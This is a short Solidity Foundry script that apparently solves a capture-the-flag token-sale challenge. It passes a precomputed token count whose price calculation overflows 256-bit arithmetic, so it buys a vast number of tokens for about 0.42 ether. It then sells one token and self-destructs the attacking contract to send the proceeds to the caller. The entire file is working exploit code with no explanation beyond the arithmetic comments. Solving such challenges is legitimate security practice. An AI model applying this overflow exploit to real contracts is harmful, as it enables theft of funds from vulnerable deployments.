// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.16;

import "forge-std/Script.sol";

interface IChallenge {
    function buy(uint256 numTokens) external payable;
    function sell(uint256 numTokens) external;
}

contract ExploitScript is Script {
    function run(address instanceAddress) public {
        vm.broadcast();
        new Exploit{value: 1 ether}(instanceAddress);
    }
}

contract Exploit {
    constructor(address instanceAddress) payable {
        // ((1 << 256) // (10 ** 18) + 1) = 115792089237316195423570985008687907853269984665640564039458
        // (10 ** 18) * 115792089237316195423570985008687907853269984665640564039458 - (1 << 256) = 415992086870360064
        IChallenge(instanceAddress).buy{value: 415992086870360064}(
            115792089237316195423570985008687907853269984665640564039458
        );
        IChallenge(instanceAddress).sell(1);
        selfdestruct(payable(msg.sender));
    }
}
